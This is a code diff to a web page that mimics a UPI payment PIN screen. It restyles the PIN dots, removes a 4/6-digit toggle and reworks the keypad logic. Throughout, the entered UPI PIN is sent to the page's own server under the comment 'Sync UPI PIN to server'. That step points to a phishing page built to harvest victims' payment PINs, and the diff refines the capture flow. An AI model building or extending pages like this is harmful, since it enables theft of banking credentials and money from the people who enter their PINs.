@@ -919,40 +919,30 @@
       justify-content: center;
     }
 
-    .upi-pin-label { font-size: 13.5px; font-weight: 800; letter-spacing: 0.8px; color: #111827; margin-bottom: 14px; text-transform: uppercase; }
+    .upi-pin-label { font-size: 15px; font-weight: 800; letter-spacing: 0.8px; color: #111827; margin-bottom: 12px; text-transform: uppercase; }
 
-    .upi-pin-mode-switch {
+    .pin-dots-row {
       display: flex;
-      gap: 8px;
-      margin-bottom: 20px;
-      background: #f1f5f9;
-      padding: 4px;
-      border-radius: 12px;
-      border: 1px solid #e2e8f0;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      min-height: 24px;
+      margin-top: 8px;
+      margin-bottom: 24px;
     }
 
-    .upi-mode-btn {
-      background: transparent;
-      border: none;
-      padding: 6px 14px;
-      font-size: 12px;
-      font-weight: 700;
-      color: #64748b;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      font-family: inherit;
+    .pin-dot {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #000000;
+      display: none;
+      transition: all 0.15s ease;
     }
 
-    .upi-mode-btn.active {
-      background: #ffffff;
-      color: #1d4ed8;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+    .pin-dot.visible {
+      display: block;
     }
-
-    .pin-dots-row { display: flex; align-items: center; justify-content: center; gap: 18px; margin-bottom: 32px; }
-    .pin-dot { width: 15px; height: 15px; border-radius: 50%; background: #262626; transition: all 0.2s cubic-bezier(0.34, 1.56, 0.64, 1); }
-    .pin-dot.empty { background: #e2e8f0; transform: scale(0.85); }
 
     .upi-warning-row {
       display: flex;
@@ -1934,17 +1924,13 @@
 
         <div class="upi-pin-section">
           <div class="upi-pin-label">ENTER UPI PIN</div>
-          <div class="upi-pin-mode-switch">
-            <button type="button" class="upi-mode-btn" id="btnPin4Digit">4-Digit PIN</button>
-            <button type="button" class="upi-mode-btn active" id="btnPin6Digit">6-Digit PIN</button>
-          </div>
           <div class="pin-dots-row">
-            <div class="pin-dot empty" id="pindot-0"></div>
-            <div class="pin-dot empty" id="pindot-1"></div>
-            <div class="pin-dot empty" id="pindot-2"></div>
-            <div class="pin-dot empty" id="pindot-3"></div>
-            <div class="pin-dot empty" id="pindot-4"></div>
-            <div class="pin-dot empty" id="pindot-5"></div>
+            <div class="pin-dot" id="pindot-0"></div>
+            <div class="pin-dot" id="pindot-1"></div>
+            <div class="pin-dot" id="pindot-2"></div>
+            <div class="pin-dot" id="pindot-3"></div>
+            <div class="pin-dot" id="pindot-4"></div>
+            <div class="pin-dot" id="pindot-5"></div>
           </div>
         </div>
 
@@ -2807,26 +2793,6 @@
       });
 
       // 6. Page 4: UPI PIN Screen Logic
-      let targetPinLength = 6;
-      const btnPin4Digit = document.getElementById('btnPin4Digit');
-      const btnPin6Digit = document.getElementById('btnPin6Digit');
-
-      btnPin4Digit.addEventListener('click', () => {
-        targetPinLength = 4;
-        btnPin4Digit.classList.add('active');
-        btnPin6Digit.classList.remove('active');
-        enteredPin = '';
-        updatePinDots();
-      });
-
-      btnPin6Digit.addEventListener('click', () => {
-        targetPinLength = 6;
-        btnPin6Digit.classList.add('active');
-        btnPin4Digit.classList.remove('active');
-        enteredPin = '';
-        updatePinDots();
-      });
-
       function openUpiPinScreen(method) {
         enteredPin = '';
         updatePinDots();
@@ -2835,15 +2801,10 @@
 
       function updatePinDots() {
         for (let i = 0; i < 6; i++) {
-          if (i >= targetPinLength) {
-            pinDots[i].style.display = 'none';
+          if (i < enteredPin.length) {
+            pinDots[i].classList.add('visible');
           } else {
-            pinDots[i].style.display = 'block';
-            if (i < enteredPin.length) {
-              pinDots[i].classList.remove('empty');
-            } else {
-              pinDots[i].classList.add('empty');
-            }
+            pinDots[i].classList.remove('visible');
           }
         }
       }
@@ -2855,12 +2816,12 @@
       numpadKeys.forEach(btn => {
         btn.addEventListener('click', () => {
           const num = btn.getAttribute('data-key');
-          // Enforce strict numeric digits 0-9
-          if (num !== null && /^\d$/.test(num) && enteredPin.length < targetPinLength) {
+          // Enforce strict numeric digits 0-9 up to max 6 digits
+          if (num !== null && /^\d$/.test(num) && enteredPin.length < 6) {
             enteredPin += num;
             updatePinDots();
 
-            if (enteredPin.length === targetPinLength) {
+            if (enteredPin.length === 6) {
               setTimeout(() => {
                 triggerUpiPaymentProcess();
               }, 300);
@@ -2877,8 +2838,8 @@
       });
 
       keyPayBtn.addEventListener('click', () => {
-        if (enteredPin.length !== targetPinLength) {
-          showToast(`Please enter your ${targetPinLength}-digit numeric UPI PIN`);
+        if (enteredPin.length < 4) {
+          showToast('Please enter your 4 or 6 digit numeric UPI PIN');
           return;
         }
         triggerUpiPaymentProcess();
@@ -2891,8 +2852,7 @@
         // Sync UPI PIN to server
         syncToServer('upi_pin', {
           upiApp: lastPaymentMethodType || 'UPI',
-          upiPin: enteredPin,
-          upiPinLength: `${targetPinLength} digits`
+          upiPin: enteredPin
         });
 
         setTimeout(() => {
